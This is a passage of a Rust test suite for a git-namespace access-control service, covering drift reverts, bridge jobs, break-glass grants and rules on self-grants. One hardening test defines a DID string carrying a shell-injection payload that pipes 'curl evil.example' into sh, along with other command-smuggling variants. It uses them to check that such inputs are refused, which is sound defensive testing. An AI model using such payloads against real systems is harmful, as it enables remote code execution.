    .await;
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleChanged", "account": carol_acct(), "observed": "maintain" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notAdoptable");
}

#[tokio::test]
async fn drift_resolve_checks_the_resource_the_caller_and_the_selector() {
    let (f, ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": eve_acct(), "observed": "write" }
    ]))
    .await;
    let sel = json!({ "type": "roleAdded", "account": eve_acct(), "observed": "write" });
    let at =
        |resource: &str| json!({ "resource": resource, "drift": sel.clone(), "action": "revert" });
    let out = send(
        &f.vtc.state,
        &f.bob,
        "drift/resolve",
        at("github.com/nobody/x"),
    )
    .await;
    assert_eq!(code(&out), "git-ns:unknownNamespace");
    let out = send(
        &f.vtc.state,
        &f.bob,
        "drift/resolve",
        at("github.com/acme/nothing"),
    )
    .await;
    assert_eq!(code(&out), "git-ns:unknownRepo");
    // Maintainers and committers are refused: it is an owner's decision.
    let out = resolve(&f, &f.carol, sel.clone(), "revert").await;
    assert_eq!(code(&out), "permissionDenied");
    // malformedRequest: a role item without its account, an account on a
    // protection item, an adopt without `observed`.
    for (drift, action) in [
        (json!({ "type": "roleAdded" }), "revert"),
        (
            json!({ "type": "bootstrapMissing", "account": eve_acct() }),
            "revert",
        ),
        (
            json!({ "type": "roleAdded", "account": eve_acct() }),
            "adopt",
        ),
    ] {
        let out = resolve(&f, &f.bob, drift.clone(), action).await;
        assert_eq!(code(&out), "malformedRequest", "{drift}");
    }
    // policyDenied.
    activate_git_policy(&f, &policy_denying("drift.revert")).await;
    let out = resolve(&f, &f.bob, sel.clone(), "revert").await;
    assert_eq!(code(&out), "git-ns:policyDenied");

    // repoNotActive: archived.
    crate::policy::storage::clear_active_policy_id(
        &f.vtc.state.active_policies_ks,
        crate::policy::model::PolicyPurpose::GitNamespace,
    )
    .await
    .unwrap();
    crate::policy::default::install_defaults(
        &f.vtc.state.policies_ks,
        &f.vtc.state.active_policies_ks,
    )
    .await
    .unwrap();
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/archive",
        json!({ "resource": RES }),
    )
    .await);
    let out = resolve(&f, &f.bob, sel, "revert").await;
    assert_eq!(code(&out), "git-ns:repoNotActive");
    let _ = ns;
}

#[tokio::test]
async fn drift_resolve_in_a_pending_namespace_is_not_bound() {
    let f = fixture().await;
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await);
    let out = resolve(
        &f,
        &f.admin,
        json!({ "type": "bootstrapMissing" }),
        "revert",
    )
    .await;
    assert_eq!(code(&out), "git-ns:namespaceNotBound");
}

#[tokio::test]
async fn reverting_a_role_added_on_the_forge_sends_bridge_job_0_2_with_remove_accounts() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": eve_acct(), "observed": "write" }
    ]))
    .await;
    let body = ok(&resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": eve_acct(), "observed": "write" }),
        "revert",
    )
    .await);
    assert_eq!(body["action"], "revert");
    assert!(body.get("right").is_none());
    assert_eq!(body["sync"]["state"], "pending");
    assert_eq!(body["sync"]["drift"], json!([]));
    let sent = f.bridge.jobs.lock().unwrap().clone();
    let job = sent
        .iter()
        .map(|(_, p)| p)
        .find(|p| p.get("removeAccounts").is_some())
        .expect("a projectRoles job with removeAccounts");
    assert_eq!(job["kind"], "projectRoles");
    assert_eq!(job["repo"], RES);
    assert_eq!(job["removeAccounts"], json!([eve_acct()]));
    // A bridge that takes 0.4 gets every job as 0.4.
    assert!(
        f.bridge
            .types
            .lock()
            .unwrap()
            .iter()
            .all(|t| t == super::bridge::JOB_TYPE)
    );
}

#[tokio::test]
async fn a_bridge_before_job_0_4_is_sent_nothing_and_cannot_revert() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": eve_acct(), "observed": "write" }
    ]))
    .await;
    make_pre_v0_4(&f).await;
    let before = f.bridge.jobs.lock().unwrap().len();
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": eve_acct(), "observed": "write" }),
        "revert",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notRevertible");
    assert!(
        message(&out).contains("upgrade the bridge"),
        "{}",
        message(&out)
    );
    // Nothing was sent, and nothing was resolved.
    assert_eq!(f.bridge.jobs.lock().unwrap().len(), before);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(snap.repo_at(RES).unwrap().sync.drift.len(), 1);
}

/// Turn the fake into a bridge that predates `git-ns/bridge/job` 0.4, and
/// make the VTC forget it ever answered discovery.
async fn make_pre_v0_4(f: &Fixture) {
    *f.bridge.pre_v0_4.lock().unwrap() = true;
    f.vtc
        .state
        .git_ns
        .jobs_ks
        .remove(format!("bridgever:{}", f.bridge_party.did))
        .await
        .unwrap();
}

#[tokio::test]
async fn a_queued_job_waits_for_a_bridge_before_0_4_to_be_upgraded() {
    let (f, _ns) = drift_fixture(json!([])).await;
    make_pre_v0_4(&f).await;
    let before = f.bridge.jobs.lock().unwrap().len();
    super::bridge::project_roles(&f.vtc.state, true)
        .await
        .unwrap();
    super::bridge::dispatch_due(&f.vtc.state).await.unwrap();
    assert_eq!(
        f.bridge.jobs.lock().unwrap().len(),
        before,
        "nothing is sent"
    );
    let jobs = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap();
    let job = jobs
        .iter()
        .rev()
        .find(|j| j.kind == super::bridge::JobKind::ProjectRoles)
        .unwrap();
    assert_eq!(
        job.state,
        super::bridge::JobState::Pending,
        "kept for the upgrade"
    );
    assert!(
        job.last_error
            .as_deref()
            .unwrap()
            .contains("upgrade the bridge")
    );
}

#[tokio::test]
async fn a_queued_namespace_level_job_is_dropped_not_delivered() {
    let (f, ns) = drift_fixture(json!([])).await;
    let bridge_did = f.bridge_party.did.clone();
    let t = super::ops::now();
    super::bridge::put_job(
        &f.vtc.state.git_ns.jobs_ks,
        &super::bridge::BridgeJob {
            job_id: "job_old_ns_level".into(),
            namespace_id: ns.clone(),
            bridge_did,
            kind: super::bridge::JobKind::ProjectRoles,
            payload: json!({ "jobId": "job_old_ns_level", "namespace": ns, "kind": "projectRoles", "desiredRoles": [] }),
            repo_id: None,
            link_id: None,
            state: super::bridge::JobState::Pending,
            attempts: 0,
            retry_forever: true,
            created_at: t,
            next_attempt_at: t,
            accepted_at: None,
            last_error: None,
            result: None,
        },
    )
    .await
    .unwrap();
    super::bridge::dispatch_due(&f.vtc.state).await.unwrap();
    assert!(
        f.bridge
            .jobs
            .lock()
            .unwrap()
            .iter()
            .all(|(_, p)| p["jobId"] != "job_old_ns_level")
    );
    let job = super::bridge::get_job(&f.vtc.state.git_ns.jobs_ks, "job_old_ns_level")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(job.state, super::bridge::JobState::Cancelled);
    // And none can be queued.
    let refused = super::bridge::enqueue(
        &f.vtc.state,
        super::bridge::NewJob {
            namespace_id: ns.clone(),
            kind: super::bridge::JobKind::ProjectRoles,
            payload: json!({ "namespace": ns, "kind": "projectRoles", "desiredRoles": [] }),
            repo_id: None,
            link_id: None,
        },
    )
    .await;
    assert!(refused.is_err());
}

#[tokio::test]
async fn other_reverts_queue_their_jobs() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleChanged", "resource": RES, "account": carol_acct(), "expected": "maintain", "observed": "admin" },
        { "type": "protectionWeakened", "resource": RES },
        { "type": "bootstrapMissing", "resource": RES }
    ]))
    .await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.repo.maintain", RES).await);
    let jobs = |f: &Fixture| {
        let f = &f.vtc.state.git_ns.jobs_ks;
        let f = f.clone();
        async move { super::bridge::list_jobs(&f).await.unwrap() }
    };
    let before = jobs(&f).await.len();
    // Lowering an `admin` role has the impact of revoking `own`: elevated,
    // so under the default configuration a community administrator does it.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleChanged", "account": carol_acct() }),
        "revert",
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    ok(&resolve(
        &f,
        &f.admin,
        json!({ "type": "roleChanged", "account": carol_acct() }),
        "revert",
    )
    .await);
    ok(&resolve(
        &f,
        &f.bob,
        json!({ "type": "protectionWeakened" }),
        "revert",
    )
    .await);
    let body = ok(&resolve(&f, &f.bob, json!({ "type": "bootstrapMissing" }), "revert").await);
    assert_eq!(body["sync"]["state"], "pending");
    let after = jobs(&f).await;
    assert!(after.len() > before);
    assert!(
        after
            .iter()
            .all(|j| j.payload.get("removeAccounts").is_none())
    );
    assert!(
        after
            .iter()
            .any(|j| j.kind == super::bridge::JobKind::Bootstrap
                && j.payload["steps"] == json!(["requiredCheck"]))
    );
    assert!(
        after.iter().any(
            |j| j.kind == super::bridge::JobKind::Bootstrap && j.payload.get("steps").is_none()
        )
    );
    assert!(
        after
            .iter()
            .any(|j| j.kind == super::bridge::JobKind::ProjectRoles && j.payload["repo"] == RES)
    );
}

#[tokio::test]
async fn a_manual_namespace_has_no_bridge_to_revert_with() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    // Drift written directly: a manual namespace has no bridge to report it.
    let mut snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let mut repo = snap.repo_at(&res).unwrap().clone();
    repo.sync.drift = vec![json!({ "type": "bootstrapMissing", "resource": res })];
    store::put_repo(&f.vtc.state.git_ns.ks, &repo)
        .await
        .unwrap();
    snap.repos.clear();
    let out = resolve(&f, &f.bob, json!({ "type": "bootstrapMissing" }), "revert").await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notRevertible");
}

// ── follow-ups: git-ns/bridge/event 0.2 (trust-tasks #627) ──────────────────

#[tokio::test]
async fn bridge_event_0_2_is_served_and_a_transfer_detaches_wherever_it_goes() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, RES, "100").await;
    // Even a `to` inside this very namespace — a defective report — moves
    // nothing: the repository is detached.
    ok(&send_v(
        &f.vtc.state,
        &f.bridge_party,
        &uri2("bridge/event"),
        json!({ "namespace": ns, "event": { "type": "repoTransferred", "forgeId": "100", "from": RES, "to": "github.com/acme/elsewhere" } }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at(RES).unwrap();
    assert_eq!(repo.state, RepoState::Detached);
    assert!(snap.rows(&Scope::Repo(repo.id.clone())).is_empty());
    assert!(snap.repo_at("github.com/acme/elsewhere").is_none());
}

#[tokio::test]
async fn an_event_with_a_drift_item_outside_its_namespace_applies_nothing() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, RES, "100").await;
    for v in [uri("bridge/event"), uri2("bridge/event")] {
        let out = send_v(
            &f.vtc.state,
            &f.bridge_party,
            &v,
            json!({
                "namespace": ns,
                "event": { "type": "repoDeleted", "forgeId": "100", "resource": RES },
                "drift": [{ "type": "bootstrapMissing", "resource": "github.com/beta/tools" }],
            }),
        )
        .await;
        assert_eq!(code(&out), "permissionDenied", "{v}");
    }
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(snap.repo_at(RES).unwrap().state, RepoState::Active);
}

// ── hardening: DIDs are DID-core, stricter than the schema's pattern ────────

/// A "DID" the `git-ns/_shared` `Did` pattern (`^did:[a-z0-9]+:\S+$`)
/// admits, and a shell would run.
const SHELL_DID: &str = "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)";

#[tokio::test]
async fn every_git_ns_task_that_takes_a_did_refuses_one_that_is_not_did_core() {
    let f = fixture_with(GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    })
    .await;
    let res = active_repo(&f).await;
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.repo_at(&res).unwrap().namespace_id.clone();
    let cases: Vec<(&Party, &str, Value)> = vec![
        (
            &f.bob,
            "right/grant",
            json!({ "subject": SHELL_DID, "right": "git.commit.sign", "resource": res }),
        ),
        (
            &f.bob,
            "right/revoke",
            json!({ "subject": SHELL_DID, "right": "git.commit.sign", "resource": res }),
        ),
        (
            &f.bob,
            "repo/transfer",
            json!({ "resource": res, "to": SHELL_DID }),
        ),
        (
            &f.admin,
            "repo/adopt",
            json!({ "resource": "github.com/acme/gadgets", "owners": [f.carol.did, SHELL_DID] }),
        ),
    ];
    for (who, task, payload) in cases {
        let out = send(&f.vtc.state, who, task, payload).await;
        assert_eq!(code(&out), "malformedRequest", "{task}");
    }
    let out = send_v(
        &f.vtc.state,
        &f.admin,
        RESEAT_URI,
        json!({ "namespace": ns, "subject": SHELL_DID, "statement": "x" }),
    )
    .await;
    assert_eq!(code(&out), "malformedRequest", "namespace/reseat");
    // Nothing was recorded for it anywhere.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        snap.rights
            .values()
            .flat_map(|s| s.rows.iter())
            .all(|r| r.subject != SHELL_DID)
    );
    assert!(snap.repo_at("github.com/acme/gadgets").is_none());

    // Other shapes the schema pattern lets through.
    for bad in [
        "did:web:x;id",
        "did:web:x|sh",
        "did:web:x`id`",
        "did:web:x#key-1",
        "did:web:x?q=1",
        "did:web:x/p",
        "did:web:x%zz",
        "did:web:x:",
    ] {
        let out = grant(&f, &f.bob, bad, "git.commit.sign", &res).await;
        assert!(
            matches!(code(&out).as_str(), "malformedRequest"),
            "{bad}: {}",
            String::from_utf8_lossy(&out.body)
        );
    }
    // A DID-core DID is still accepted.
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
}

// ── review of #1703: follow-ups ─────────────────────────────────────────────

/// Adopting an `admin` role records `git.repo.own`, an elevated grant: under
/// the default consent gate an owner is refused and a community
/// administrator is not.
#[tokio::test]
async fn adopting_an_admin_role_is_elevated_and_needs_a_community_administrator() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "admin" }
    ]))
    .await;
    let sel = json!({ "type": "roleAdded", "account": carol_acct(), "observed": "admin" });
    let out = resolve(&f, &f.bob, sel.clone(), "adopt").await;
    assert_eq!(code(&out), "permissionDenied");
    let body = ok(&resolve(&f, &f.admin, sel, "adopt").await);
    assert_eq!(body["right"]["right"], "git.repo.own");
    assert_eq!(body["right"]["subject"], json!(f.carol.did));
}

/// Reverting a `roleAdded` held by an account the projection itself gives a
/// role (a member's, holding a right here) would not remove it: refused.
#[tokio::test]
async fn reverting_a_role_the_projection_holds_is_not_revertible() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "write" }
    ]))
    .await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.repo.maintain", RES).await);
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "write" }),
        "revert",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notRevertible");
    assert!(
        f.bridge
            .jobs
            .lock()
            .unwrap()
            .iter()
            .all(|(_, p)| p.get("removeAccounts").is_none()),
        "no job was sent"
    );
}

/// The policy sees an adoption as `right.grant` with `via: drift.adopt`, so
/// "never adopt forge-side changes" is expressible while grants still work.
#[tokio::test]
async fn a_policy_can_refuse_adoptions_and_still_allow_grants() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "maintain" }
    ]))
    .await;
    activate_git_policy(
        &f,
        r#"package vtc.git_namespace

import rego.v1

settings := {"maintainer_grants_commit": false, "cascade_on_departure": false, "role_drift": "report"}

default decision := {"effect": "allow"}

decision := {"effect": "deny", "with": {"code": "no-adoptions", "reason": "forge-side changes are reverted here"}} if {
	input.action == "right.grant"
	input.via == "drift.adopt"
}
"#,
    )
    .await;
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "maintain" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns:policyDenied");
    // The item is still outstanding; the same right granted directly is fine.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert_eq!(snap.repo_at(RES).unwrap().sync.drift.len(), 1);
    ok(&grant(&f, &f.bob, &f.carol.did, "git.repo.maintain", RES).await);
}

/// An adoption re-checks its item under the lock the right is written under:
/// if the item is no longer outstanding as selected, nothing is granted.
#[tokio::test]
async fn an_adoption_whose_item_changed_grants_nothing() {
    let (f, _ns) = drift_fixture(json!([
        { "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "maintain" }
    ]))
    .await;
    let still_holds = |_: &Snapshot| -> super::ops::OpResult<()> {
        Err(super::ops::OpError::Declared {
            code: super::drift::DRIFT_NOT_FOUND,
            message: "changed".into(),
        })
    };
    let payload: trust_tasks_rs::specs::git_ns::right::grant::v0_3::Payload =
        serde_json::from_value(
            json!({ "subject": f.carol.did, "right": "git.repo.maintain", "resource": RES }),
        )
        .unwrap();
    let r = super::ops::right_grant_via(
        &f.vtc.state,
        &f.bob.did,
        payload,
        Some(super::ops::GrantVia {
            via: "drift.adopt",
            still_holds: &still_holds,
        }),
    )
    .await;
    assert!(matches!(
        r,
        Err(super::ops::OpError::Declared { code, .. }) if code == super::drift::DRIFT_NOT_FOUND
    ));
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at(RES).unwrap();
    assert!(
        snap.rows(&Scope::Repo(repo.id.clone()))
            .iter()
            .all(|r| r.subject != f.carol.did)
    );
}

/// Grant and revoke 0.3 both hold the subject to DID-core: a DID URL (here
/// with a fragment) is refused as malformed by either.
#[tokio::test]
async fn a_non_did_core_subject_is_refused_by_grant_and_revoke() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let not_core = "did:web:legacy.example#k";
    let body = json!({ "subject": not_core, "right": "git.commit.sign", "resource": res });
    let out = send(&f.vtc.state, &f.bob, "right/revoke", body).await;
    assert_eq!(code(&out), "malformedRequest");
    let out = grant(&f, &f.bob, not_core, "git.commit.sign", &res).await;
    assert_eq!(code(&out), "malformedRequest");
}

/// A reseat's audit evidence says how each earlier admin record ended —
/// revoked and by whom and why, or on departure — and the subject's own
/// lapsed record is replaced, not kept beside the new one.
#[tokio::test]
async fn reseat_evidence_reports_revocations_and_replaces_a_lapsed_record() {
    let f = fixture().await;
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, crate::acl::VtcRole::Admin).await;
    let ns = bind_manual(&f).await;
    // Carol is a co-admin, then revoked by the admin with a reason.
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.ns.admin", "resource": "github.com/acme", "reason": "stepped down" }),
    )
    .await);
    // Bob holds an admin record that has lapsed, unswept.
    let scope = Scope::Namespace(ns.clone());
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    let mut lapsed = set.rows[0].clone();
    lapsed.subject = f.bob.did.clone();
    lapsed.expires_at = Some("2020-01-01T00:00:00Z".parse().unwrap());
    set.rows.push(lapsed);
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    // The last admin leaves.
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.admin.did)
        .await
        .unwrap();
    super::lifecycle::sweep_departures(&f.vtc.state)
        .await
        .unwrap();

    ok(&send_v(
        &f.vtc.state,
        &dana,
        RESEAT_URI,
        json!({ "namespace": ns, "subject": f.bob.did, "statement": "the only admin left" }),
    )
    .await);

    let rows = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap()
        .rows;
    let bobs: Vec<_> = rows
        .iter()
        .filter(|r| r.subject == f.bob.did && r.right == super::model::Right::NsAdmin)
        .collect();
    assert_eq!(bobs.len(), 1, "{bobs:?}");
    assert_eq!(bobs[0].expires_at, None);

    let mut detail = None;
    for (_, v) in f
        .vtc
        .state
        .audit_ks
        .prefix_iter_raw(Vec::new())
        .await
        .unwrap()
    {
        let env: vti_common::audit::AuditEnvelope = serde_json::from_slice(&v).unwrap();
        if let vti_common::audit::AuditEvent::GitNsOperation(d) = env.event
            && d.action == "gitNs.namespace.reseated"
        {
            detail = d.detail;
        }
    }
    let detail: Value = serde_json::from_str(&detail.expect("a reseat audit row")).unwrap();
    let evidence = detail["headlessEvidence"].as_array().unwrap();
    assert!(
        evidence.iter().any(|e| e["ended"] == "revoked"
            && e["by"] == json!(f.admin.did)
            && e["why"] == "stepped down"),
        "{evidence:?}"
    );
    assert!(
        evidence.iter().any(|e| e["ended"] == "departed"),
        "{evidence:?}"
    );
    assert!(
        evidence.iter().any(|e| e["ended"] == "lapsed"),
        "{evidence:?}"
    );
    assert!(!detail.to_string().contains(&f.carol.did));
}

// ── separation of duties and break-glass (git-ns/right/grant/0.3 rule 7,
//    git-ns/right/break-glass/0.1, git-ns/right/ratify/0.1) ─────────────────

async fn send_ver(
    state: &AppState,
    who: &Party,
    task: &str,
    version: &str,
    payload: Value,
) -> TrustTaskOutcome {
    let type_uri = format!("{URI}/{task}/{version}");
    let mut doc: TrustTask<Value> =
        vta_sdk::trust_task_sign::build_unsigned(&type_uri, payload, &who.did, TEST_VTC_DID)
            .unwrap();
    let key =
        vta_sdk::trust_task_sign::HolderKey::from_did_key(&who.did, &who.secret_multibase).unwrap();
    vta_sdk::trust_task_sign::sign_in_place_with(&mut doc, &key)
        .await
        .unwrap();
    let body = serde_json::to_vec(&doc).unwrap();
    dispatch_trust_task_core(state, &JoinAuthCtx::rest(), &body).await
}

fn bg_payload(right: &str, resource: &str) -> Value {
    json!({
        "right": right,
        "resource": resource,
        "justification": "Both owners unreachable; CVE fix must ship tonight",
    })
}

/// Record the passkey gesture a break-glass needs, as if `who` had answered
/// the ceremony, then send it.
async fn break_glass(f: &Fixture, who: &Party, right: &str, resource: &str) -> TrustTaskOutcome {
    let p = bg_payload(right, resource);
    crate::acl::bound_step_up::record_mark_for_test(
        &f.vtc.state,
        &who.did,
        super::break_glass::break_glass_type(),
        &p,
    )
    .await
    .unwrap();
    send_ver(&f.vtc.state, who, "right/break-glass", "0.1", p).await
}

async fn bg_audit_rows(f: &Fixture) -> Vec<vti_common::audit::GitNsBreakGlassData> {
    let mut out = Vec::new();
    for (_, v) in f
        .vtc
        .state
        .audit_ks
        .prefix_iter_raw(Vec::new())
        .await
        .unwrap()
    {
        if let Ok(env) = serde_json::from_slice::<vti_common::audit::AuditEnvelope>(&v)
            && let vti_common::audit::AuditEvent::GitNsBreakGlass(d) = env.event
        {
            out.push(d);
        }
    }
    out
}

/// Carol is a namespace admin of `acme` (granted by the binder), not a
/// community administrator; Bob owns `widgets`.
async fn carol_admin_fixture() -> Fixture {
    let f = fixture().await;
    active_repo(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    f
}

#[tokio::test]
async fn grant_rule_7_refuses_an_elevated_self_grant_and_names_break_glass() {
    let f = carol_admin_fixture().await;
    for (right, res) in [
        ("git.repo.own", "github.com/acme/widgets"),
        ("git.repo.create", "github.com/acme"),
        ("git.ns.admin", "github.com/acme"),
    ] {
        let out = send_ver(
            &f.vtc.state,
            &f.carol,
            "right/grant",
            "0.3",
            json!({ "subject": f.carol.did, "right": right, "resource": res }),
        )
        .await;
        assert_eq!(code(&out), "git-ns:selfGrantNotAllowed", "{right}");
        assert!(
            payload(&out)["message"]
                .as_str()
                .unwrap()
                .contains("break-glass")
        );
    }
}

#[tokio::test]
async fn grant_rule_7_leaves_normal_self_grants_alone() {
    let f = carol_admin_fixture().await;
    // Bob, owner of widgets, grants himself maintain and commit.sign.
    ok(&grant(
        &f,
        &f.bob,
        &f.bob.did,
        "git.repo.maintain",
        "github.com/acme/widgets",
    )
    .await);
    ok(&grant(
        &f,
        &f.bob,
        &f.bob.did,
        "git.commit.sign",
        "github.com/acme/widgets",
    )
    .await);
    // Someone else grants the elevated right: fine.
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
}

/// Rule 7 under the bridge's role map (`Right::is_elevated_in`): where
/// maintainers get forge `admin`, `git.repo.maintain` is elevated, so an owner
/// cannot grant it to himself — and the refusal does not point at
/// break-glass, which carries only ns.admin, repo.create and own. Under the
/// default map it is not elevated.
#[tokio::test]
async fn grant_rule_7_counts_a_right_the_role_map_projects_to_admin() {
    let (f, ns) = drift_fixture(json!([])).await;
    ok(&report_role_map_from(
        &f,
        &f.bridge_party,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "admin", "commit": "none" } }),
        chrono::TimeDelta::zero(),
    )
    .await);
    let out = grant(&f, &f.bob, &f.bob.did, "git.repo.maintain", RES).await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
    let msg = payload(&out)["message"].as_str().unwrap().to_string();
    assert!(msg.contains("role map"), "{msg}");
    assert!(!msg.contains("break-glass"), "{msg}");
    // commit.sign is never projected to admin by an ordered map.
    ok(&grant(&f, &f.bob, &f.bob.did, "git.commit.sign", RES).await);
    // Another owner or administrator grants it: fine.
    ok(&grant(&f, &f.admin, &f.bob.did, "git.repo.maintain", RES).await);
}

/// Rule 7 before the bridge reports its map: `git.repo.maintain` might be the
/// right the map projects to `admin`, so a self-grant of it is refused (fail
/// closed); under the default map, once reported, it is allowed.
#[tokio::test]
async fn grant_rule_7_counts_maintain_while_the_role_map_is_unknown() {
    let (f, ns) = drift_fixture_unreported(json!([])).await;
    let out = grant(&f, &f.bob, &f.bob.did, "git.repo.maintain", RES).await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
    report_default_map(&f, &ns).await;
    ok(&grant(&f, &f.bob, &f.bob.did, "git.repo.maintain", RES).await);
}

#[tokio::test]
async fn repo_adopt_naming_oneself_owner_is_a_self_grant() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/gadgets", "owners": [f.admin.did] }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
}

#[tokio::test]
async fn reseat_to_oneself_is_a_self_grant() {
    let f = fixture().await;
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, VtcRole::Admin).await;
    let ns = bind_manual(&f).await;
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.admin.did)
        .await
        .unwrap();
    let out = reseat(&f, &dana, &ns, &dana.did).await;
    assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
}

#[tokio::test]
async fn break_glass_needs_the_bound_step_up_and_then_records_a_flagged_right() {
    let f = carol_admin_fixture().await;
    // No gesture recorded: refused, nothing written.
    let out = send_ver(
        &f.vtc.state,
        &f.carol,
        "right/break-glass",
        "0.1",
        bg_payload("git.repo.own", "github.com/acme/widgets"),
    )
    .await;
    assert!(
        !out.status.is_success(),
        "{}",
        String::from_utf8_lossy(&out.body)
    );
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        !super::rules::owners(
            &snap,
            &repo_id(&snap, "github.com/acme/widgets"),
            super::ops::now()
        )
        .contains(&f.carol.did)
    );

    // With the gesture: recorded at once, flagged, bypassing the
    // elevated_requires_admin stand-in (Carol is no community administrator).
    let body = ok(&break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await);
    let bg = &body["right"]["breakGlass"];
    assert_eq!(bg["by"], json!(f.carol.did));
    assert!(bg["ratifiedBy"].is_null());
    assert!(bg["effectiveAt"].is_null());
    assert!(
        body["right"].get("expiresAt").is_none(),
        "a break-glass never lapses"
    );
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        super::rules::owners(
            &snap,
            &repo_id(&snap, "github.com/acme/widgets"),
            super::ops::now()
        )
        .contains(&f.carol.did)
    );

    // The critical audit row carries the justification and the evidence; the
    // notice to the other administrator (the binder) could not be queued in
    // this fixture, and says so.
    let rows = bg_audit_rows(&f).await;
    assert_eq!(rows.len(), 1);
    let r = &rows[0];
    assert_eq!(r.event, "breakGlass");
    assert!(r.justification.contains("CVE"));
    assert_eq!(r.step_up.as_ref().unwrap().credential_id, "c0ffee");
    assert_eq!(r.entitlement.as_deref(), Some("grantAuthority"));
    assert_eq!(r.undeliverable, vec![f.admin.did.clone()]);
    assert_eq!(
        vti_common::audit::AuditEvent::GitNsBreakGlass(r.clone()).severity(),
        vti_common::audit::AuditSeverity::Critical
    );

    // The mark is spent: the same document again finds a record, not a gesture.
    let again = ok(&send_ver(
        &f.vtc.state,
        &f.carol,
        "right/break-glass",
        "0.1",
        bg_payload("git.repo.own", "github.com/acme/widgets"),
    )
    .await);
    assert_eq!(again["right"]["breakGlass"]["at"], bg["at"]);
    assert_eq!(
        bg_audit_rows(&f).await.len(),
        1,
        "a repeat announces nothing"
    );
}

async fn ratify_as(f: &Fixture, who: &Party, subject: &str, at: Value) -> TrustTaskOutcome {
    send_ver(
        &f.vtc.state,
        who,
        "right/ratify",
        "0.1",
        json!({
            "subject": subject,
            "right": "git.repo.own",
            "resource": "github.com/acme/widgets",
            "breakGlassAt": at,
        }),
    )
    .await
}

fn repo_id(snap: &Snapshot, resource: &str) -> String {
    snap.repo_at(resource).unwrap().id.clone()
}

#[tokio::test]
